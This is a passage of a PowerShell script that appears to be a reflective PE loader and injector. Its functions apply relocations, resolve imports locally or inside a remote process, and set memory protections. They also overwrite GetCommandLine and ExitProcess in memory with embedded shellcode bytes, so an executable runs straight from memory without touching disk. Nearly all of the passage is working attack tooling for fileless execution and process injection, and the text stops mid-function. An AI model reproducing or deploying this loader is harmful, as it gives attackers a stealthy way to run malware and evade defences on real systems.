        [IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
        while($true)
        {
            #If SizeOfBlock == 0, we are done
            $BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

            if ($BaseRelocationTable.SizeOfBlock -eq 0)
            {
                break
            }

            [IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
            $NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

            #Loop through each relocation
            for($i = 0; $i -lt $NumRelocations; $i++)
            {
                #Get info for this relocation
                $RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
                [UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

                #First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
                [UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
                [UInt16]$RelocType = $RelocationInfo -band 0xF000
                for ($j = 0; $j -lt 12; $j++)
                {
                    $RelocType = [Math]::Floor($RelocType / 2)
                }

                #For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
                #This appears to be true for EXE's as well.
                #   Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
                if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
                        -or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
                {
                    #Get the current memory address and update it based off the difference between PE expected base address and actual base address
                    [IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
                    [IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])

                    if ($AddDifference -eq $true)
                    {
                        [IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                    }
                    else
                    {
                        [IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                    }

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
                }
                elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
                {
                    #IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
                    Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
                }
            }

            $BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
        }
    }


    Function Import-DllImports
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Types,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants,

        [Parameter(Position = 4, Mandatory = $false)]
        [IntPtr]
        $RemoteProcHandle
        )

        $RemoteLoading = $false
        if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
        {
            $RemoteLoading = $true
        }

        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)

            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)

                #If the structure is null, it signals that this is the end of the array
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done importing DLL imports"
                    break
                }

                $ImportDllHandle = [IntPtr]::Zero
                $ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)

                if ($RemoteLoading -eq $true)
                {
                    $ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
                }
                else
                {
                    $ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
                }

                if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
                {
                    throw "Error importing DLL, DLLName: $ImportDllPath"
                }

                #Get the first thunk, then loop through all of them
                [IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
                [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
                [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

                while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
                {
                    $LoadByOrdinal = $false
                    [IntPtr]$ProcedureNamePtr = [IntPtr]::Zero
                    #Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
                    #   If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
                    #   and doing the comparison, just see if it is less than 0
                    [IntPtr]$NewThunkRef = [IntPtr]::Zero
                    if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)
                    {
                        [IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
                    }
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)
                    {
                        [IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
                    }
                    else
                    {
                        [IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
                        $StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
                        $ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                        $ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
                    }

                    if ($RemoteLoading -eq $true)
                    {
                        [IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal
                    }
                    else
                    {
                        [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
                    }

                    if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
                    {
                        if ($LoadByOrdinal)
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath"
                        }
                        else
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                        }
                    }

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)

                    $ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

                    #Cleanup
                    #If loading by ordinal, ProcedureNamePtr is the ordinal value and not actually a pointer to a buffer that needs to be freed
                    if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
                        $ProcedureNamePtr = [IntPtr]::Zero
                    }
                }

                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
    }

    Function Get-VirtualProtectValue
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt32]
        $SectionCharacteristics
        )

        $ProtectionFlag = 0x0
        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE
                }
            }
        }
        else
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READONLY
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_NOACCESS
                }
            }
        }

        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
        {
            $ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
        }

        return $ProtectionFlag
    }

    Function Update-MemoryProtectionFlags
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )

        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
            [IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)

            [UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
            [UInt32]$SectionSize = $SectionHeader.VirtualSize

            [UInt32]$OldProtectFlag = 0
            Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
            $Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Unable to change memory protection"
            }
        }
    }

    #This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
    #Returns an object with addresses to copies of the bytes that were overwritten (and the count)
    Function Update-ExeFunctions
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,

        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $ExeArguments,

        [Parameter(Position = 4, Mandatory = $true)]
        [IntPtr]
        $ExeDoneBytePtr
        )

        #This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
        $ReturnArray = @()

        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        [UInt32]$OldProtectFlag = 0

        [IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
        if ($Kernel32Handle -eq [IntPtr]::Zero)
        {
            throw "Kernel32 handle null"
        }

        [IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
        if ($KernelBaseHandle -eq [IntPtr]::Zero)
        {
            throw "KernelBase handle null"
        }

        #################################################
        #First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
        #   We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
        $CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
        $CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)

        [IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
        [IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

        if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
        {
            throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)"
        }

        #Prepare the shellcode
        [Byte[]]$Shellcode1 = @()
        if ($PtrSize -eq 8)
        {
            $Shellcode1 += 0x48 #64bit shellcode has the 0x48 before the 0xb8
        }
        $Shellcode1 += 0xb8

        [Byte[]]$Shellcode2 = @(0xc3)
        $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length

        #Make copy of GetCommandLineA and GetCommandLineW
        $GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
        $Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
        $ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
        $ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

        #Overwrite GetCommandLineA
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw "Call to VirtualProtect failed"
        }

        $GetCommandLineAAddrTemp = $GetCommandLineAAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp

        $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null


        #Overwrite GetCommandLineW
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw "Call to VirtualProtect failed"
        }

        $GetCommandLineWAddrTemp = $GetCommandLineWAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp

        $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        #################################################

        #################################################
        #For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
        #   I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
        #   It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
        #   argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
        $DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
            , "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")

        foreach ($Dll in $DllList)
        {
            [IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
            if ($DllHandle -ne [IntPtr]::Zero)
            {
                [IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
                [IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
                if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
                {
                    "Error, couldn't find _wcmdln or _acmdln"
                }

                $NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
                $NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)

                #Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
                $OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
                $OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
                $OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                $OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
                $ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
                $ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)

                $Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null

                $Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
            }
        }
        #################################################

        #################################################
        #Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

        $ReturnArray = @()
        $ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process

        #CorExitProcess (compiled in to visual studio c++)
        [IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
        if ($MscoreeHandle -eq [IntPtr]::Zero)
        {
            throw "mscoree handle null"
        }
        [IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
        if ($CorExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw "CorExitProcess address not found"
        }
        $ExitFunctions += $CorExitProcessAddr

        #ExitProcess (what non-managed programs use)
        [IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
        if ($ExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw "ExitProcess address not found"
        }
        $ExitFunctions += $ExitProcessAddr

        [UInt32]$OldProtectFlag = 0
        foreach ($ProcExitFunctionAddr in $ExitFunctions)
        {
            $ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
            #The following is the shellcode (Shellcode: ExitThread.asm):
            #32bit shellcode
            [Byte[]]$Shellcode1 = @(0xbb)
            [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
            #64bit shellcode (Shellcode: ExitThread.asm)
            if ($PtrSize -eq 8)
            {
                [Byte[]]$Shellcode1 = @(0x48, 0xbb)
                [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
            }
            [Byte[]]$Shellcode3 = @(0xff, 0xd3)
            $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length

            [IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
            if ($ExitThreadAddr -eq [IntPtr]::Zero)
            {
                Throw "ExitThread address not found"
            }

            $Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }

            #Make copy of original ExitProcess bytes
            $ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
            $Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
            $ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)

            #Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then
            #   call ExitThread
            Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

            $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
        #################################################

        Write-Output $ReturnArray
    }

    #This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
    #   It copies Count bytes from Source to Destination.
    Function Copy-ArrayOfMemAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Array[]]
        $CopyInfo,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        [UInt32]$OldProtectFlag = 0
        foreach ($Info in $CopyInfo)
        {
            $Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }

            $Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null

            $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
    }


    #####################################
    ##########    FUNCTIONS   ###########
    #####################################
    Function Get-MemoryProcAddress
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,

        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FunctionName
        )

        $Win32Types = Get-Win32Types
        $Win32Constants = Get-Win32Constants
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants

        #Get the export table
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
        {
            return [IntPtr]::Zero
        }
        $ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
        $ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)

        for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
        {
            #AddressOfNames is an array of pointers to strings of the names of the functions exported
            $NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
            $NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
            $Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

            if ($Name -ceq $FunctionName)
            {
                #AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
                #    which contains the offset of the function in to the DLL
                $OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
                $FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
                $FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
                $FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
                return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
            }
        }

        return [IntPtr]::Zero
    }


    Function Invoke-MemoryLoadLibrary
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PEBytes,

        [Parameter(Position = 1, Mandatory = $false)]
        [String]
        $ExeArgs,

        [Parameter(Position = 2, Mandatory = $false)]
        [IntPtr]
        $RemoteProcHandle,

        [Parameter(Position = 3)]
        [Bool]
        $ForceASLR = $false
        )

        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

        #Get Win32 constants and functions
